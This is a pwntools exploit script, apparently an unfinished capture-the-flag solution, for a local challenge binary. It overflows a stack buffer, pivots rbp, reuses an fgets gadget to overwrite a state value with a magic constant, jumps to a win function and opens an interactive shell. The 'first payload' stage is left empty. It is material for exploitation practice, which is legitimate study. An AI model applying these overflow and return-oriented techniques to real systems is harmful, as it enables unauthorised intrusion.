from pwn import *

binary = "./chall"
p = process(binary)

# for remote: p = remote("host", port)

s = '''
b main
b * vuln+52
c
'''

gdb.attach(p, s)

# constants
VULN_ADDR = 0x4012b5
STATE_ADDR = 0x404540
FGETS_GADGET = 0x4012d0
WIN_ADDR = 0x4011d6

# first payload - return to vuln 4 times


# final payload - setup fgets and win
p.recvuntil(b"Who are you?\n")
payload = flat(
    b'h' * 0x20,
    p64(STATE_ADDR + 0x20),
    p64(FGETS_GADGET)
)[:-1]
p.send(payload)

# overwrite state value
payload = p64(0xf1eeee2d) + b'A' * 0x20 + p64(0x00000000004011d6)
p.sendline(payload)

p.interactive()

'''
1. Return to vuln function 4 times 
2. Setup fgets call with controlled rbp
3. Overwrite state with magic value
4. Pop shell
'''
